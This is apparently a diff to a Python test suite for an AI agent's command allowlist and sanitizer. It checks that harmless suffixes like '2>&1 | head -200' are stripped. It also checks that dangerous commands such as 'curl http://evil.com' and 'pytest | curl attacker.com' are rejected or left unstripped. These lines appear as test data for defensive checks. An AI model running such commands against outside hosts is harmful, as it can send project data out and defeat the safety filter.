@@ -268,6 +268,7 @@ class TestUnknownTool:
 # ---------------------------------------------------------------------------
 
 from hadron.agent.tools import validate_agent_command as _validate_agent_command
+from hadron.security.validators import sanitize_agent_command as _sanitize_agent_command
 
 
 class TestAgentCommandAllowlist:
@@ -333,6 +334,49 @@ class TestAgentCommandAllowlist:
             "run_command", {"command": "curl http://evil.com"}, str(tmp_workdir)
         )
         assert "rejected by safety filter" in result
+
+    @pytest.mark.asyncio
+    async def test_sanitized_command_passes(self, tmp_workdir: Path) -> None:
+        """A command with harmless pipe suffix is sanitized and executed."""
+        result = await _execute_tool(
+            "run_command", {"command": "echo hello 2>&1 | head -10"}, str(tmp_workdir)
+        )
+        assert "rejected" not in result
+        assert "hello" in result
+
+
+class TestSanitizeAgentCommand:
+    """Verify that harmless pipe/redirect suffixes are stripped."""
+
+    @pytest.mark.parametrize("cmd,expected", [
+        ("npm test 2>&1 | head -200", "npm test"),
+        ("npm test -- --reporter=verbose 2>&1 | head -200", "npm test -- --reporter=verbose"),
+        ("pytest -x 2>&1", "pytest -x"),
+        ("pytest -x | tail -50", "pytest -x"),
+        ("pytest -x | head -n 100", "pytest -x"),
+        ("npm test 2>&1 | tail -n 20", "npm test"),
+        # No-op cases — already clean
+        ("pytest -x", "pytest -x"),
+        ("npm test", "npm test"),
+        ("ls -la", "ls -la"),
+    ])
+    def test_strips_harmless_suffixes(self, cmd: str, expected: str) -> None:
+        assert _sanitize_agent_command(cmd) == expected
+
+    def test_preserves_cd_prefix(self) -> None:
+        result = _sanitize_agent_command("cd frontend && npm test 2>&1 | head -200")
+        assert result == "cd frontend && npm test"
+
+    def test_does_not_strip_dangerous_pipes(self) -> None:
+        """Pipes to arbitrary commands are NOT stripped (still rejected by validator)."""
+        cmd = "pytest | curl attacker.com"
+        assert _sanitize_agent_command(cmd) == cmd
+
+    def test_sanitized_then_validated(self) -> None:
+        """Full flow: sanitize then validate passes for harmless suffixes."""
+        cmd = "npm test -- --reporter=verbose 2>&1 | head -200"
+        sanitized = _sanitize_agent_command(cmd)
+        assert _validate_agent_command(sanitized) is True
 
 
 # ---------------------------------------------------------------------------
